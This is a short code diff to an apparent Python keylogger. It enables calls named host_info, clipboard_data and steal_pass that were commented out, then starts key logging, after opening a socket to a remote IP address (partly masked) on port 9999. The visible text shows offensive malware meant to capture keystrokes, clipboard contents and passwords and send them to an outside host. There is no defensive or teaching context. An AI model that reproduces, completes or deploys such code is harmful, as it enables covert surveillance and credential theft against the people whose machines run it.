@@ -145,7 +145,7 @@ class Keylogger:
 if __name__ == "__main__":
     ke = Keylogger("20.173.-.-", 9999)
     ke.start_socket()
-    # ke.host_info()
-    # ke.clipboard_data()
-    # ke.steal_pass()
+    ke.host_info()
+    ke.clipboard_data()
+    ke.steal_pass()
     ke.keylogger()
